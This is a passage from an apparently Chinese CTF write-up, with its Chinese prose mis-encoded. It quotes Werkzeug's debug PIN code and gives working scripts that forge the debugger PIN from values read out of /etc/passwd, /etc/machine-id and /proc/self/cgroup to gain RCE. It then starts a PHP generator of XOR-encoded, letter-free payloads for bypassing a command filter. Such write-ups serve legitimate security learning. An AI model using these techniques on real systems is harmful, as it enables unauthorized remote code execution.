punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token comment"># On Windows, use winreg to get the machine guid.</span>        <span class="token keyword">if</span> sys<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">"win32"</span><span class="token punctuation">:</span>            <span class="token keyword">import</span> winreg            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> winreg<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>                    winreg<span class="token punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>                    <span class="token string">"SOFTWARE\\Microsoft\\Cryptography"</span><span class="token punctuation">,</span>                    <span class="token number">0</span><span class="token punctuation">,</span>                    winreg<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> winreg<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">,</span>                <span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>                    guid<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span>                    guid_type<span class="token punctuation">:</span> <span class="token builtin">int</span>                    guid<span class="token punctuation">,</span> guid_type <span class="token operator">=</span> winreg<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">"MachineGuid"</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> guid_type <span class="token operator">==</span> winreg<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">:</span>                        <span class="token keyword">return</span> guid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> guid            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">pass</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    _machine_id <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> _machine_id<span class="token keyword">class</span> <span class="token class-name">_ConsoleFrame</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Helper class so that we can reuse the frame console code for the    standalone console.    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> namespace<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Any<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>console <span class="token operator">=</span> Console<span class="token punctuation">(</span>namespace<span class="token punctuation">)</span>        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin    code and a random key.  The hope is that this is stable between    restarts to not make debugging particularly frustrating.  If the pin    was forcefully disabled this returns `None`.    Second item in the resulting tuple is the cookie name for remembering.    """</span>    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>    rv <span class="token operator">=</span> <span class="token boolean">None</span>    num <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was explicitly disabled</span>    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was provided explicitly</span>    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># If there are separators in the pin, return it directly</span>        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>            rv <span class="token operator">=</span> pin        <span class="token keyword">else</span><span class="token punctuation">:</span>            num <span class="token operator">=</span> pin    modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># getuser imports the pwd module, which does not exist in Google</span>        <span class="token comment"># App Engine. It may also raise a KeyError if the UID does not</span>        <span class="token comment"># have a username, such as in Docker.</span>        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token boolean">None</span>    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>    <span class="token comment"># This information only exists to make the cookie unique on the</span>    <span class="token comment"># computer, not as a security feature.</span>    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>        username<span class="token punctuation">,</span>        modname<span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token comment"># This information is here to make it harder for an attacker to</span>    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>    <span class="token comment"># within the unauthenticated debug page.</span>    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>    <span class="token comment"># end up with the same value and generate out 9 digits</span>    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    <span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>    <span class="token comment"># we don't have a result yet.</span>    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> num    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±ä¸Šå¯ä»¥çœ‹å¾—å‡ºPINå€¼ç”Ÿæˆæ‰€éœ€è¦è·å–çš„æ•°æ®æœ‰</p><ul><li>usernameï¼Œç”¨æˆ·å</li><li>modnameï¼Œé»˜è®¤å€¼ä¸ºflask.app</li><li>appnameï¼Œé»˜è®¤å€¼ä¸ºFlask</li><li>moddirï¼Œflaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„</li><li>uuidnodeï¼Œå½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°</li><li>machine_idï¼Œdockeræœºå™¨idæˆ–æœ¬æœºid</li></ul><p>é¦–å…ˆæ˜¯ç”¨æˆ·å</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png"></p><p>å¯ç”¨çš„ä¼¼ä¹åªæœ‰root</p><p>ä¸‹é¢ä¸‰é¡¹ä»»æ„æŠ¥é”™å³å¯è·å¾—</p><p>macåœ°å€</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png"></p><p>Machine_id</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png"></p><p>æœ¬æœºç”Ÿæˆè„šæœ¬å¦‚ä¸‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#MD5</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'flaskweb'</span><span class="token comment"># username</span>     <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># modname</span>     <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span><span class="token comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span><span class="token comment"># get_machine_id(), /etc/machine-id</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">break</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sha1</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'root'</span><span class="token comment"># /etc/passwd</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># é»˜è®¤å€¼</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># é»˜è®¤å€¼</span>    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span> <span class="token comment"># æŠ¥é”™å¾—åˆ°</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'2485377581187'</span><span class="token punctuation">,</span><span class="token comment">#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span>    <span class="token comment">#machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>    <span class="token string">'653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'</span><span class="token comment">#  /proc/self/cgroup</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨æœ€ç»ˆç”Ÿæˆçš„PINè¿›å…¥ä»£ç è°ƒè¯•ï¼ŒRCE</p><p><strong>802</strong></p><h3 id="æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ"><a href="#æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ"></a>æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ</h3><p>å¼‚æˆ–æ³•ï¼Œå·ä¸ªè„šæœ¬å–µå–µ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*author yu22x*/</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xor_rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[a-z0-9]/i'</span><span class="token punctuation">;</span> <span class="token comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>            <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token 